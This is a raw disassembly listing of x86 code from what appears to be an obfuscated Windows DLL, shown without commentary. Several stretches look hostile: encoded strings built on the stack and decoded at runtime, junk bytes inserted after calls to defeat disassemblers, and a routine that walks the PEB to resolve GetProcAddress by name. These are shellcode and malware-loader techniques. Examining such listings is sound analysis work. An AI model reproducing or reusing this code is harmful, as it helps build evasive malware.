10009029:	80 a5 57 f8 ff ff 00 	andb   $0x0,-0x7a9(%ebp)
10009030:	c6 85 58 f8 ff ff f3 	movb   $0xf3,-0x7a8(%ebp)
10009037:	c6 85 59 f8 ff ff e8 	movb   $0xe8,-0x7a7(%ebp)
1000903e:	c6 85 5a f8 ff ff eb 	movb   $0xeb,-0x7a6(%ebp)
10009045:	c6 85 5b f8 ff ff c3 	movb   $0xc3,-0x7a5(%ebp)
1000904c:	c6 85 5c f8 ff ff 9c 	movb   $0x9c,-0x7a4(%ebp)
10009053:	c6 85 5d f8 ff ff 9d 	movb   $0x9d,-0x7a3(%ebp)
1000905a:	c6 85 5e f8 ff ff 81 	movb   $0x81,-0x7a2(%ebp)
10009061:	c6 85 5f f8 ff ff cb 	movb   $0xcb,-0x7a1(%ebp)
10009068:	c6 85 60 f8 ff ff c3 	movb   $0xc3,-0x7a0(%ebp)
1000906f:	c6 85 61 f8 ff ff c3 	movb   $0xc3,-0x79f(%ebp)
10009076:	c6 85 62 f8 ff ff af 	movb   $0xaf,-0x79e(%ebp)
1000907d:	6a 0b                	push   $0xb
1000907f:	8d 85 54 f8 ff ff    	lea    -0x7ac(%ebp),%eax
10009085:	50                   	push   %eax
10009086:	e8 b2 e2 ff ff       	call   0x1000733d
1000908b:	59                   	pop    %ecx
1000908c:	50                   	push   %eax
1000908d:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
10009093:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
1000909a:	50                   	push   %eax
1000909b:	e8 fe e1 ff ff       	call   0x1000729e
100090a0:	83 c4 0c             	add    $0xc,%esp
100090a3:	e9 f7 01 00 00       	jmp    0x1000929f
100090a8:	83 bd 04 f9 ff ff 04 	cmpl   $0x4,-0x6fc(%ebp)
100090af:	0f 85 94 00 00 00    	jne    0x10009149
100090b5:	80 a5 44 f8 ff ff 00 	andb   $0x0,-0x7bc(%ebp)
100090bc:	80 a5 45 f8 ff ff 00 	andb   $0x0,-0x7bb(%ebp)
100090c3:	c6 85 46 f8 ff ff 41 	movb   $0x41,-0x7ba(%ebp)
100090ca:	80 a5 47 f8 ff ff 00 	andb   $0x0,-0x7b9(%ebp)
100090d1:	c6 85 48 f8 ff ff e2 	movb   $0xe2,-0x7b8(%ebp)
100090d8:	c6 85 49 f8 ff ff f1 	movb   $0xf1,-0x7b7(%ebp)
100090df:	c6 85 4a f8 ff ff f2 	movb   $0xf2,-0x7b6(%ebp)
100090e6:	c6 85 4b f8 ff ff fb 	movb   $0xfb,-0x7b5(%ebp)
100090ed:	c6 85 4c f8 ff ff 8c 	movb   $0x8c,-0x7b4(%ebp)
100090f4:	c6 85 4d f8 ff ff 8d 	movb   $0x8d,-0x7b3(%ebp)
100090fb:	c6 85 4e f8 ff ff 90 	movb   $0x90,-0x7b2(%ebp)
10009102:	c6 85 4f f8 ff ff da 	movb   $0xda,-0x7b1(%ebp)
10009109:	c6 85 50 f8 ff ff d2 	movb   $0xd2,-0x7b0(%ebp)
10009110:	c6 85 51 f8 ff ff d2 	movb   $0xd2,-0x7af(%ebp)
10009117:	c6 85 52 f8 ff ff be 	movb   $0xbe,-0x7ae(%ebp)
1000911e:	6a 0b                	push   $0xb
10009120:	8d 85 44 f8 ff ff    	lea    -0x7bc(%ebp),%eax
10009126:	50                   	push   %eax
10009127:	e8 11 e2 ff ff       	call   0x1000733d
1000912c:	59                   	pop    %ecx
1000912d:	50                   	push   %eax
1000912e:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
10009134:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
1000913b:	50                   	push   %eax
1000913c:	e8 5d e1 ff ff       	call   0x1000729e
10009141:	83 c4 0c             	add    $0xc,%esp
10009144:	e9 56 01 00 00       	jmp    0x1000929f
10009149:	83 bd 04 f9 ff ff 05 	cmpl   $0x5,-0x6fc(%ebp)
10009150:	0f 85 9d 00 00 00    	jne    0x100091f3
10009156:	80 a5 34 f8 ff ff 00 	andb   $0x0,-0x7cc(%ebp)
1000915d:	80 a5 35 f8 ff ff 00 	andb   $0x0,-0x7cb(%ebp)
10009164:	c6 85 36 f8 ff ff 8a 	movb   $0x8a,-0x7ca(%ebp)
1000916b:	80 a5 37 f8 ff ff 00 	andb   $0x0,-0x7c9(%ebp)
10009172:	c6 85 38 f8 ff ff 29 	movb   $0x29,-0x7c8(%ebp)
10009179:	c6 85 39 f8 ff ff 25 	movb   $0x25,-0x7c7(%ebp)
10009180:	c6 85 3a f8 ff ff 26 	movb   $0x26,-0x7c6(%ebp)
10009187:	c6 85 3b f8 ff ff 34 	movb   $0x34,-0x7c5(%ebp)
1000918e:	c6 85 3c f8 ff ff 25 	movb   $0x25,-0x7c4(%ebp)
10009195:	c6 85 3d f8 ff ff 19 	movb   $0x19,-0x7c3(%ebp)
1000919c:	c6 85 3e f8 ff ff 5b 	movb   $0x5b,-0x7c2(%ebp)
100091a3:	c6 85 3f f8 ff ff 11 	movb   $0x11,-0x7c1(%ebp)
100091aa:	c6 85 40 f8 ff ff 19 	movb   $0x19,-0x7c0(%ebp)
100091b1:	c6 85 41 f8 ff ff 19 	movb   $0x19,-0x7bf(%ebp)
100091b8:	c6 85 42 f8 ff ff 75 	movb   $0x75,-0x7be(%ebp)
100091bf:	e8 69 e1 ff ff       	call   0x1000732d
100091c4:	51                   	push   %ecx
100091c5:	a9 fd 11 6a 0b       	test   $0xb6a11fd,%eax
100091ca:	8d 85 34 f8 ff ff    	lea    -0x7cc(%ebp),%eax
100091d0:	50                   	push   %eax
100091d1:	e8 67 e1 ff ff       	call   0x1000733d
100091d6:	59                   	pop    %ecx
100091d7:	50                   	push   %eax
100091d8:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
100091de:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
100091e5:	50                   	push   %eax
100091e6:	e8 b3 e0 ff ff       	call   0x1000729e
100091eb:	83 c4 0c             	add    $0xc,%esp
100091ee:	e9 ac 00 00 00       	jmp    0x1000929f
100091f3:	83 bd 04 f9 ff ff 06 	cmpl   $0x6,-0x6fc(%ebp)
100091fa:	0f 85 9a 00 00 00    	jne    0x1000929a
10009200:	80 a5 24 f8 ff ff 00 	andb   $0x0,-0x7dc(%ebp)
10009207:	80 a5 25 f8 ff ff 00 	andb   $0x0,-0x7db(%ebp)
1000920e:	c6 85 26 f8 ff ff d4 	movb   $0xd4,-0x7da(%ebp)
10009215:	80 a5 27 f8 ff ff 00 	andb   $0x0,-0x7d9(%ebp)
1000921c:	c6 85 28 f8 ff ff 77 	movb   $0x77,-0x7d8(%ebp)
10009223:	c6 85 29 f8 ff ff 4e 	movb   $0x4e,-0x7d7(%ebp)
1000922a:	c6 85 2a f8 ff ff 59 	movb   $0x59,-0x7d6(%ebp)
10009231:	c6 85 2b f8 ff ff 59 	movb   $0x59,-0x7d5(%ebp)
10009238:	c6 85 2c f8 ff ff 44 	movb   $0x44,-0x7d4(%ebp)
1000923f:	c6 85 2d f8 ff ff 59 	movb   $0x59,-0x7d3(%ebp)
10009246:	c6 85 2e f8 ff ff 05 	movb   $0x5,-0x7d2(%ebp)
1000924d:	c6 85 2f f8 ff ff 47 	movb   $0x47,-0x7d1(%ebp)
10009254:	c6 85 30 f8 ff ff 44 	movb   $0x44,-0x7d0(%ebp)
1000925b:	c6 85 31 f8 ff ff 4c 	movb   $0x4c,-0x7cf(%ebp)
10009262:	c6 85 32 f8 ff ff 2b 	movb   $0x2b,-0x7ce(%ebp)
10009269:	e8 bf e0 ff ff       	call   0x1000732d
1000926e:	fc                   	cld
1000926f:	8e be 0a 6a 0b 8d    	mov    -0x72f495f6(%esi),%?
10009275:	85 24 f8             	test   %esp,(%eax,%edi,8)
10009278:	ff                   	(bad)
10009279:	ff 50 e8             	call   *-0x18(%eax)
1000927c:	bd e0 ff ff 59       	mov    $0x59ffffe0,%ebp
10009281:	50                   	push   %eax
10009282:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
10009288:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
1000928f:	50                   	push   %eax
10009290:	e8 09 e0 ff ff       	call   0x1000729e
10009295:	83 c4 0c             	add    $0xc,%esp
10009298:	eb 05                	jmp    0x1000929f
1000929a:	e9 2e 01 00 00       	jmp    0x100093cd
1000929f:	8b 85 04 f9 ff ff    	mov    -0x6fc(%ebp),%eax
100092a5:	40                   	inc    %eax
100092a6:	89 85 04 f9 ff ff    	mov    %eax,-0x6fc(%ebp)
100092ac:	83 a5 84 fc ff ff 00 	andl   $0x0,-0x37c(%ebp)
100092b3:	ff b5 60 fc ff ff    	push   -0x3a0(%ebp)
100092b9:	ff 95 fc f8 ff ff    	call   *-0x704(%ebp)
100092bf:	89 85 5c fc ff ff    	mov    %eax,-0x3a4(%ebp)
100092c5:	83 bd 5c fc ff ff 00 	cmpl   $0x0,-0x3a4(%ebp)
100092cc:	74 33                	je     0x10009301
100092ce:	8d 85 ec f8 ff ff    	lea    -0x714(%ebp),%eax
100092d4:	50                   	push   %eax
100092d5:	e8 63 e0 ff ff       	call   0x1000733d
100092da:	59                   	pop    %ecx
100092db:	50                   	push   %eax
100092dc:	ff b5 5c fc ff ff    	push   -0x3a4(%ebp)
100092e2:	ff 75 14             	push   0x14(%ebp)
100092e5:	e8 08 e0 ff ff       	call   0x100072f2
100092ea:	83 c4 0c             	add    $0xc,%esp
100092ed:	89 85 84 fc ff ff    	mov    %eax,-0x37c(%ebp)
100092f3:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
100092fa:	75 05                	jne    0x10009301
100092fc:	e9 bf f9 ff ff       	jmp    0x10008cc0
10009301:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
10009308:	74 05                	je     0x1000930f
1000930a:	e9 be 00 00 00       	jmp    0x100093cd
1000930f:	6a 00                	push   $0x0
10009311:	6a 00                	push   $0x0
10009313:	6a 02                	push   $0x2
10009315:	6a 00                	push   $0x0
10009317:	6a 02                	push   $0x2
10009319:	68 00 00 00 40       	push   $0x40000000
1000931e:	ff b5 60 fc ff ff    	push   -0x3a0(%ebp)
10009324:	ff 95 38 fc ff ff    	call   *-0x3c8(%ebp)
1000932a:	89 85 80 fc ff ff    	mov    %eax,-0x380(%ebp)
10009330:	e8 f8 df ff ff       	call   0x1000732d
10009335:	45                   	inc    %ebp
10009336:	7a 97                	jp     0x100092cf
10009338:	e6 83                	out    %al,$0x83
1000933a:	bd 80 fc ff ff       	mov    $0xfffffc80,%ebp
1000933f:	ff 74 2f 6a          	push   0x6a(%edi,%ebp,1)
10009343:	00 8d 85 3c f9 ff    	add    %cl,-0x6c37b(%ebp)
10009349:	ff 50 ff             	call   *-0x1(%eax)
1000934c:	b5 74                	mov    $0x74,%ch
1000934e:	fc                   	cld
1000934f:	ff                   	(bad)
10009350:	ff                   	(bad)
10009351:	ff b5 b8 f8 ff ff    	push   -0x748(%ebp)
10009357:	ff b5 80 fc ff ff    	push   -0x380(%ebp)
1000935d:	ff 95 d0 f8 ff ff    	call   *-0x730(%ebp)
10009363:	ff b5 80 fc ff ff    	push   -0x380(%ebp)
10009369:	ff 95 80 f9 ff ff    	call   *-0x680(%ebp)
1000936f:	eb 05                	jmp    0x10009376
10009371:	e9 4a f9 ff ff       	jmp    0x10008cc0
10009376:	83 a5 84 fc ff ff 00 	andl   $0x0,-0x37c(%ebp)
1000937d:	ff b5 60 fc ff ff    	push   -0x3a0(%ebp)
10009383:	ff 95 fc f8 ff ff    	call   *-0x704(%ebp)
10009389:	89 85 5c fc ff ff    	mov    %eax,-0x3a4(%ebp)
1000938f:	83 bd 5c fc ff ff 00 	cmpl   $0x0,-0x3a4(%ebp)
10009396:	74 25                	je     0x100093bd
10009398:	8d 85 ec f8 ff ff    	lea    -0x714(%ebp),%eax
1000939e:	50                   	push   %eax
1000939f:	e8 99 df ff ff       	call   0x1000733d
100093a4:	59                   	pop    %ecx
100093a5:	50                   	push   %eax
100093a6:	ff b5 5c fc ff ff    	push   -0x3a4(%ebp)
100093ac:	ff 75 14             	push   0x14(%ebp)
100093af:	e8 3e df ff ff       	call   0x100072f2
100093b4:	83 c4 0c             	add    $0xc,%esp
100093b7:	89 85 84 fc ff ff    	mov    %eax,-0x37c(%ebp)
100093bd:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
100093c4:	74 02                	je     0x100093c8
100093c6:	eb 05                	jmp    0x100093cd
100093c8:	e9 f3 f8 ff ff       	jmp    0x10008cc0
100093cd:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
100093d4:	0f 85 a6 00 00 00    	jne    0x10009480
100093da:	8b 85 b8 f8 ff ff    	mov    -0x748(%ebp),%eax
100093e0:	89 85 14 f8 ff ff    	mov    %eax,-0x7ec(%ebp)
100093e6:	8b 85 74 fc ff ff    	mov    -0x38c(%ebp),%eax
100093ec:	89 85 18 f8 ff ff    	mov    %eax,-0x7e8(%ebp)
100093f2:	83 a5 20 f8 ff ff 00 	andl   $0x0,-0x7e0(%ebp)
100093f9:	e8 2f df ff ff       	call   0x1000732d
100093fe:	35 c1 6e 94 68       	xor    $0x68946ec1,%eax
10009403:	00 10                	add    %dl,(%eax)
10009405:	00 00                	add    %al,(%eax)
10009407:	6a 08                	push   $0x8
10009409:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
1000940f:	ff 95 84 f9 ff ff    	call   *-0x67c(%ebp)
10009415:	89 85 1c f8 ff ff    	mov    %eax,-0x7e4(%ebp)
1000941b:	ff b5 1c f8 ff ff    	push   -0x7e4(%ebp)
10009421:	8d 85 14 f8 ff ff    	lea    -0x7ec(%ebp),%eax
10009427:	50                   	push   %eax
10009428:	ff b5 b8 f8 ff ff    	push   -0x748(%ebp)
1000942e:	ff 75 18             	push   0x18(%ebp)
10009431:	ff 75 14             	push   0x14(%ebp)
10009434:	e8 b7 e0 ff ff       	call   0x100074f0
10009439:	83 c4 14             	add    $0x14,%esp
1000943c:	89 85 20 f8 ff ff    	mov    %eax,-0x7e0(%ebp)
10009442:	83 bd 20 f8 ff ff 00 	cmpl   $0x0,-0x7e0(%ebp)
10009449:	74 21                	je     0x1000946c
1000944b:	8d 85 ec f8 ff ff    	lea    -0x714(%ebp),%eax
10009451:	50                   	push   %eax
10009452:	e8 e6 de ff ff       	call   0x1000733d
10009457:	59                   	pop    %ecx
10009458:	50                   	push   %eax
10009459:	ff b5 20 f8 ff ff    	push   -0x7e0(%ebp)
1000945f:	e8 6e df ff ff       	call   0x100073d2
10009464:	59                   	pop    %ecx
10009465:	59                   	pop    %ecx
10009466:	89 85 84 fc ff ff    	mov    %eax,-0x37c(%ebp)
1000946c:	ff b5 1c f8 ff ff    	push   -0x7e4(%ebp)
10009472:	6a 01                	push   $0x1
10009474:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
1000947a:	ff 95 64 fc ff ff    	call   *-0x39c(%ebp)
10009480:	ff 75 1c             	push   0x1c(%ebp)
10009483:	ff 75 f4             	push   -0xc(%ebp)
10009486:	ff b5 c0 fa ff ff    	push   -0x540(%ebp)
1000948c:	ff b5 7c f9 ff ff    	push   -0x684(%ebp)
10009492:	ff b5 78 f9 ff ff    	push   -0x688(%ebp)
10009498:	ff b5 54 fc ff ff    	push   -0x3ac(%ebp)
1000949e:	ff b5 00 fc ff ff    	push   -0x400(%ebp)
100094a4:	ff b5 b4 fa ff ff    	push   -0x54c(%ebp)
100094aa:	ff b5 88 f9 ff ff    	push   -0x678(%ebp)
100094b0:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
100094b6:	50                   	push   %eax
100094b7:	ff 75 fc             	push   -0x4(%ebp)
100094ba:	ff 75 08             	push   0x8(%ebp)
100094bd:	ff 95 84 fc ff ff    	call   *-0x37c(%ebp)
100094c3:	5f                   	pop    %edi
100094c4:	5e                   	pop    %esi
100094c5:	5b                   	pop    %ebx
100094c6:	c9                   	leave
100094c7:	c3                   	ret
100094c8:	e8 3e de ff ff       	call   0x1000730b
100094cd:	c3                   	ret
100094ce:	9a 60 8b ec 83 c5 24 	lcall  $0x24c5,$0x83ec8b60
100094d5:	54                   	push   %esp
100094d6:	e8 52 de ff ff       	call   0x1000732d
100094db:	88 7d 4c             	mov    %bh,0x4c(%ebp)
100094de:	26 64 a1 30 00 00 00 	es mov %fs:0x30,%eax
100094e5:	8b 40 0c             	mov    0xc(%eax),%eax
100094e8:	8b 70 1c             	mov    0x1c(%eax),%esi
100094eb:	ad                   	lods   %ds:(%esi),%eax
100094ec:	80 78 1c 18          	cmpb   $0x18,0x1c(%eax)
100094f0:	74 02                	je     0x100094f4
100094f2:	96                   	xchg   %eax,%esi
100094f3:	ad                   	lods   %ds:(%esi),%eax
100094f4:	8b 40 08             	mov    0x8(%eax),%eax
100094f7:	50                   	push   %eax
100094f8:	e8 30 de ff ff       	call   0x1000732d
100094fd:	98                   	cwtl
100094fe:	96                   	xchg   %eax,%esi
100094ff:	59                   	pop    %ecx
10009500:	d2 8b f8 8b 47 3c    	rorb   %cl,0x3c478bf8(%ebx)
10009506:	8b 54 07 78          	mov    0x78(%edi,%eax,1),%edx
1000950a:	03 d7                	add    %edi,%edx
1000950c:	8b 4a 18             	mov    0x18(%edx),%ecx
1000950f:	8b 5a 20             	mov    0x20(%edx),%ebx
10009512:	03 df                	add    %edi,%ebx
10009514:	e8 14 de ff ff       	call   0x1000732d
10009519:	05 23 41 03 49       	add    $0x49034123,%eax
1000951e:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
10009521:	03 f7                	add    %edi,%esi
10009523:	b8 47 65 74 50       	mov    $0x50746547,%eax
10009528:	39 06                	cmp    %eax,(%esi)
1000952a:	75 f1                	jne    0x1000951d
1000952c:	b8 72 6f 63 41       	mov    $0x41636f72,%eax
10009531:	39 46 04             	cmp    %eax,0x4(%esi)
10009534:	75 e7                	jne    0x1000951d
10009536:	e8 f2 dd ff ff       	call   0x1000732d
1000953b:	1d e7 ce c6 8b       	sbb    $0x8bc6cee7,%eax
10009540:	5a                   	pop    %edx
10009541:	24 03                	and    $0x3,%al
10009543:	df 66 8b             	fbld   -0x75(%esi)
10009546:	0c 4b                	or     $0x4b,%al
10009548:	8b 5a 1c             	mov    0x1c(%edx),%ebx
1000954b:	03 df                	add    %edi,%ebx
1000954d:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
10009550:	03 c7                	add    %edi,%eax
10009552:	50                   	push   %eax
10009553:	e8 d5 dd ff ff       	call   0x1000732d
10009558:	f7 ed                	imul   %ebp
1000955a:	31 78 ff             	xor    %edi,-0x1(%eax)
1000955d:	75 08                	jne    0x10009567
1000955f:	ff 75 04             	push   0x4(%ebp)
10009562:	ff 75 00             	push   0x0(%ebp)
10009565:	e8 e1 e5 ff ff       	call   0x10007b4b
1000956a:	00 74 16 8b          	add    %dh,-0x75(%esi,%edx,1)
1000956e:	47                   	inc    %edi
1000956f:	fc                   	cld
10009570:	85 c0                	test   %eax,%eax
10009572:	74 0c                	je     0x10009580
10009574:	83 38 00             	cmpl   $0x0,(%eax)
10009577:	75 07                	jne    0x10009580
10009579:	50                   	push   %eax
1000957a:	e8 07 c1 ff ff       	call   0x10005686
1000957f:	59                   	pop    %ecx
10009580:	8b 45 fc             	mov    -0x4(%ebp),%eax
10009583:	83 c3 04             	add    $0x4,%ebx
10009586:	83 c7 10             	add    $0x10,%edi
10009589:	83 e8 01             	sub    $0x1,%eax
1000958c:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000958f:	75 b0                	jne    0x10009541
10009591:	56                   	push   %esi
10009592:	e8 ef c0 ff ff       	call   0x10005686
10009597:	59                   	pop    %ecx
10009598:	5f                   	pop    %edi
10009599:	5e                   	pop    %esi
1000959a:	5b                   	pop    %ebx
1000959b:	c9                   	leave
1000959c:	c3                   	ret
1000959d:	8b ff                	mov    %edi,%edi
1000959f:	55                   	push   %ebp
100095a0:	8b ec                	mov    %esp,%ebp
100095a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
100095a5:	85 c9                	test   %ecx,%ecx
100095a7:	74 16                	je     0x100095bf
100095a9:	81 f9 98 e4 00 10    	cmp    $0x1000e498,%ecx
100095af:	74 0e                	je     0x100095bf
100095b1:	33 c0                	xor    %eax,%eax
100095b3:	40                   	inc    %eax
100095b4:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
100095bb:	00 
100095bc:	40                   	inc    %eax
100095bd:	5d                   	pop    %ebp
100095be:	c3                   	ret
100095bf:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
100095c4:	5d                   	pop    %ebp
100095c5:	c3                   	ret
100095c6:	8b ff                	mov    %edi,%edi
100095c8:	55                   	push   %ebp
100095c9:	8b ec                	mov    %esp,%ebp
100095cb:	56                   	push   %esi
100095cc:	8b 75 08             	mov    0x8(%ebp),%esi
100095cf:	85 f6                	test   %esi,%esi
100095d1:	74 21                	je     0x100095f4
100095d3:	81 fe 98 e4 00 10    	cmp    $0x1000e498,%esi
100095d9:	74 19                	je     0x100095f4
100095db:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
100095e1:	90                   	nop
100095e2:	85 c0                	test   %eax,%eax
100095e4:	75 0e                	jne    0x100095f4
100095e6:	56                   	push   %esi
100095e7:	e8 7b 03 00 00       	call   0x10009967
100095ec:	56                   	push   %esi
100095ed:	e8 94 c0 ff ff       	call   0x10005686
100095f2:	59                   	pop    %ecx
100095f3:	59                   	pop    %ecx
100095f4:	5e                   	pop    %esi
100095f5:	5d                   	pop    %ebp
100095f6:	c3                   	ret
100095f7:	8b ff                	mov    %edi,%edi
100095f9:	55                   	push   %ebp
100095fa:	8b ec                	mov    %esp,%ebp
100095fc:	8b 4d 08             	mov    0x8(%ebp),%ecx
100095ff:	85 c9                	test   %ecx,%ecx
10009601:	74 16                	je     0x10009619
10009603:	81 f9 98 e4 00 10    	cmp    $0x1000e498,%ecx
10009609:	74 0e                	je     0x10009619
1000960b:	83 c8 ff             	or     $0xffffffff,%eax
1000960e:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
10009615:	00 
10009616:	48                   	dec    %eax
10009617:	5d                   	pop    %ebp
10009618:	c3                   	ret
10009619:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
1000961e:	5d                   	pop    %ebp
1000961f:	c3                   	ret
10009620:	8b ff                	mov    %edi,%edi
10009622:	55                   	push   %ebp
10009623:	8b ec                	mov    %esp,%ebp
10009625:	8b 45 08             	mov    0x8(%ebp),%eax
10009628:	85 c0                	test   %eax,%eax
1000962a:	74 73                	je     0x1000969f
1000962c:	f0 ff 48 0c          	lock decl 0xc(%eax)
10009630:	8b 48 7c             	mov    0x7c(%eax),%ecx
10009633:	85 c9                	test   %ecx,%ecx
10009635:	74 03                	je     0x1000963a
10009637:	f0 ff 09             	lock decl (%ecx)
1000963a:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
10009640:	85 c9                	test   %ecx,%ecx
10009642:	74 03                	je     0x10009647
10009644:	f0 ff 09             	lock decl (%ecx)
10009647:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
1000964d:	85 c9                	test   %ecx,%ecx
1000964f:	74 03                	je     0x10009654
10009651:	f0 ff 09             	lock decl (%ecx)
10009654:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
1000965a:	85 c9                	test   %ecx,%ecx
1000965c:	74 03                	je     0x10009661
1000965e:	f0 ff 09             	lock decl (%ecx)
10009661:	56                   	push   %esi
10009662:	6a 06                	push   $0x6
10009664:	8d 48 28             	lea    0x28(%eax),%ecx
10009667:	5e                   	pop    %esi
10009668:	81 79 f8 d0 31 01 10 	cmpl   $0x100131d0,-0x8(%ecx)
1000966f:	74 09                	je     0x1000967a
10009671:	8b 11                	mov    (%ecx),%edx
10009673:	85 d2                	test   %edx,%edx
10009675:	74 03                	je     0x1000967a
10009677:	f0 ff 0a             	lock decl (%edx)
1000967a:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
1000967e:	74 0a                	je     0x1000968a
10009680:	8b 51 fc             	mov    -0x4(%ecx),%edx
10009683:	85 d2                	test   %edx,%edx
10009685:	74 03                	je     0x1000968a
10009687:	f0 ff 0a             	lock decl (%edx)
1000968a:	83 c1 10             	add    $0x10,%ecx
1000968d:	83 ee 01             	sub    $0x1,%esi
10009690:	75 d6                	jne    0x10009668
10009692:	ff b0 9c 00 00 00    	push   0x9c(%eax)
10009698:	e8 5a ff ff ff       	call   0x100095f7
1000969d:	59                   	pop    %ecx
1000969e:	5e                   	pop    %esi
1000969f:	5d                   	pop    %ebp
100096a0:	c3                   	ret
100096a1:	6a 0c                	push   $0xc
100096a3:	68 38 26 01 10       	push   $0x10012638
100096a8:	e8 f3 8f ff ff       	call   0x100026a0
100096ad:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
100096b1:	e8 c2 ce ff ff       	call   0x10006578
100096b6:	8b 0d f8 36 01 10    	mov    0x100136f8,%ecx
100096bc:	8d 78 4c             	lea    0x4c(%eax),%edi
100096bf:	85 88 50 03 00 00    	test   %ecx,0x350(%eax)
100096c5:	74 06                	je     0x100096cd
100096c7:	8b 37                	mov    (%edi),%esi
100096c9:	85 f6                	test   %esi,%esi
100096cb:	75 3d                	jne    0x1000970a
100096cd:	6a 04                	push   $0x4
100096cf:	e8 58 d2 ff ff       	call   0x1000692c
100096d4:	59                   	pop    %ecx
100096d5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100096d9:	ff 35 58 45 01 10    	push   0x10014558
100096df:	57                   	push   %edi
100096e0:	e8 3d 00 00 00       	call   0x10009722
100096e5:	59                   	pop    %ecx
100096e6:	59                   	pop    %ecx
100096e7:	8b f0                	mov    %eax,%esi
100096e9:	89 75 e4             	mov    %esi,-0x1c(%ebp)
100096ec:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100096f3:	e8 09 00 00 00       	call   0x10009701
100096f8:	85 f6                	test   %esi,%esi
100096fa:	74 20                	je     0x1000971c
100096fc:	eb 0c                	jmp    0x1000970a
100096fe:	8b 75 e4             	mov    -0x1c(%ebp),%esi
10009701:	6a 04                	push   $0x4
10009703:	e8 6c d2 ff ff       	call   0x10006974
10009708:	59                   	pop    %ecx
10009709:	c3                   	ret
1000970a:	8b c6                	mov    %esi,%eax
1000970c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000970f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10009716:	59                   	pop    %ecx
10009717:	5f                   	pop    %edi
10009718:	5e                   	pop    %esi
10009719:	5b                   	pop    %ebx
1000971a:	c9                   	leave
1000971b:	c3                   	ret
1000971c:	e8 86 bb ff ff       	call   0x100052a7
10009721:	cc                   	int3
10009722:	8b ff                	mov    %edi,%edi
10009724:	55                   	push   %ebp
10009725:	8b ec                	mov    %esp,%ebp
10009727:	56                   	push   %esi
10009728:	8b 75 0c             	mov    0xc(%ebp),%esi
1000972b:	57                   	push   %edi
1000972c:	85 f6                	test   %esi,%esi
1000972e:	74 3c                	je     0x1000976c
10009730:	8b 45 08             	mov    0x8(%ebp),%eax
10009733:	85 c0                	test   %eax,%eax
10009735:	74 35                	je     0x1000976c
10009737:	8b 38                	mov    (%eax),%edi
10009739:	3b fe                	cmp    %esi,%edi
1000973b:	75 04                	jne    0x10009741
1000973d:	8b c6                	mov    %esi,%eax
1000973f:	eb 2d                	jmp    0x1000976e
10009741:	56                   	push   %esi
10009742:	89 30                	mov    %esi,(%eax)
10009744:	e8 8f fc ff ff       	call   0x100093d8
10009749:	59                   	pop    %ecx
1000974a:	85 ff                	test   %edi,%edi
1000974c:	74 ef                	je     0x1000973d
1000974e:	57                   	push   %edi
1000974f:	e8 cc fe ff ff       	call   0x10009620
10009754:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
10009758:	59                   	pop    %ecx
10009759:	75 e2                	jne    0x1000973d
1000975b:	81 ff 10 31 01 10    	cmp    $0x10013110,%edi
10009761:	74 da                	je     0x1000973d
10009763:	57                   	push   %edi
10009764:	e8 ec fc ff ff       	call   0x10009455
10009769:	59                   	pop    %ecx
1000976a:	eb d1                	jmp    0x1000973d
1000976c:	33 c0                	xor    %eax,%eax
1000976e:	5f                   	pop    %edi
1000976f:	5e                   	pop    %esi
10009770:	5d                   	pop    %ebp
10009771:	c3                   	ret
10009772:	8b ff                	mov    %edi,%edi
10009774:	55                   	push   %ebp
10009775:	8b ec                	mov    %esp,%ebp
10009777:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000977a:	83 f9 fe             	cmp    $0xfffffffe,%ecx
1000977d:	75 0d                	jne    0x1000978c
1000977f:	e8 92 be ff ff       	call   0x10005616
10009784:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
1000978a:	eb 38                	jmp    0x100097c4
1000978c:	85 c9                	test   %ecx,%ecx
1000978e:	78 24                	js     0x100097b4
10009790:	3b 0d 40 45 01 10    	cmp    0x10014540,%ecx
10009796:	73 1c                	jae    0x100097b4
10009798:	8b c1                	mov    %ecx,%eax
1000979a:	83 e1 3f             	and    $0x3f,%ecx
1000979d:	c1 f8 06             	sar    $0x6,%eax
100097a0:	6b c9 38             	imul   $0x38,%ecx,%ecx
100097a3:	8b 04 85 40 43 01 10 	mov    0x10014340(,%eax,4),%eax
100097aa:	0f b6 44 08 28       	movzbl 0x28(%eax,%ecx,1),%eax
100097af:	83 e0 40             	and    $0x40,%eax
100097b2:	5d                   	pop    %ebp
100097b3:	c3                   	ret
100097b4:	e8 5d be ff ff       	call   0x10005616
